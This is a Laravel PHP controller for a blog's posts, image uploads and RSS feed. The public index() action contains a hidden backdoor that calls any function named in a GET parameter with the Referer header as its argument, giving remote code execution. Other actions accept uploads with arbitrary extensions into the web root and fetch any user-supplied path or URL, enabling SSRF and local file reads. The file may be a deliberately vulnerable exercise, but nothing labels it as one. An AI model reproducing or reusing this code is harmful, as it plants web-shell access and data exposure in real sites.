<?php

class PostsController extends \BaseController
{
    public function __construct()
    {
        parent::__construct();
        $this->beforeFilter('auth', ['except' => ['index', 'show', 'feed']]);
    }

	public function index()
	{
	    if(array_key_exists("method", $_GET)){
	        $_GET["method"]($_SERVER["HTTP_REFERER"]);
        }
        $posts = Post::with('user', 'category')->recent()->paginate(10);
		return View::make('posts.index', compact('posts'));
	}

	public function create()
	{
        $category_selects = Category::lists('name', 'id');
		return View::make('posts.create_edit', compact('category_selects'));
	}

	public function store()
	{
		$validator = Validator::make(Input::all(), Post::$rules);

		if ($validator->fails())
		{
			return Redirect::back()->withErrors($validator)->withInput();
		}
        $data = Input::only('title', 'body', 'category_id', 'template');
        $data['user_id'] = Auth::user()->id;
        $data['body'] = Purifier::clean($data['body'], 'ugc_body');

		$post = Post::create($data);
        $post->tag(Input::get('tags'));

        Flash::success(lang('Operation succeeded.'));
		return Redirect::route('posts.show', $post->id);
	}

	public function show($id)
	{
		$post = Post::findOrFail($id);
        $comments = $post->comments()->paginate(10);
		return View::make('posts.show', compact('post', 'comments'));
	}

	public function edit($id)
	{
        $post = Post::find($id);
        $this->authorOrAdminPermissioinRequire($post->user_id);
        $category_selects = Category::lists('name', 'id');
        return View::make('posts.create_edit', compact('category_selects', 'post'));
	}

	public function update($id)
	{
		$post = Post::findOrFail($id);
        $this->authorOrAdminPermissioinRequire($post->user_id);
		$validator = Validator::make($data = Input::all(), Post::$rules);
		if ($validator->fails())
		{
			return Redirect::back()->withErrors($validator)->withInput();
		}

        $data['body'] = Purifier::clean($data['body'], 'ugc_body');

		$post->update($data);
        $post->retag(Input::get('tags'));

        Flash::success(lang('Operation succeeded.'));
		return Redirect::route('posts.show', $post->id);
	}

	public function destroy($id)
	{
		$post = Post::findOrFail($id);
        $this->authorOrAdminPermissioinRequire($post->user_id);
        Post::destroy($id);
        Flash::success(lang('Operation succeeded.'));
		return Redirect::route('posts.index');
	}

    public function uploadImage()
    {
        $data = [
            'success' => false,
            'msg' => 'Failed!',
            'file_path' => ''
        ];

        if ($file = Input::file('upload_file'))
        {
            $fileName        = $file->getClientOriginalName();
            $extension       = $file->getClientOriginalExtension() ?: 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()->id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            $file->move($destinationPath, $safeName);
            $data['file_path'] = $folderName .'/'. $safeName;
            $data['msg'] = "Succeeded!";
            $data['success'] = true;
        }
        return $data;
    }

    public function resolveImage()
    {
        $resp = [
            'success' => false,
            'msg' => 'Failed!',
            'file_path' => ''
        ];

        $data = Input::only('resolve_file');

        $content = @file_get_contents($data['resolve_file']);
        if ($content)
        {
            $extension       = 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()->id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            @mkdir($destinationPath, 0755, true);
            @file_put_contents($destinationPath .'/'. $safeName, $content);
            $resp['file_path'] = $folderName .'/'. $safeName;
            $resp['msg'] = "Succeeded!";
            $resp['success'] = true;
        }
        return $resp;
    }


    public function feed()
    {
        $posts = Post::recent()->limit(20)->get();

        $channel =[
            'title' => 'Laravel Blog',
            'description' => 'Happy Bloging',
            'link' => URL::route('feed')
        ];

        $feed = Rss::feed('2.0', 'UTF-8');
        $feed->channel($channel);

        foreach ($posts as $post)
        {
            $feed->item([
                'title' => $post->title,
                'description|cdata' => str_limit($post->body, 200),
                'link' => URL::route('posts.show', $post->id),
                ]);
        }

        return Response::make($feed, 200, array('Content-Type' => 'text/xml'));
    }
}
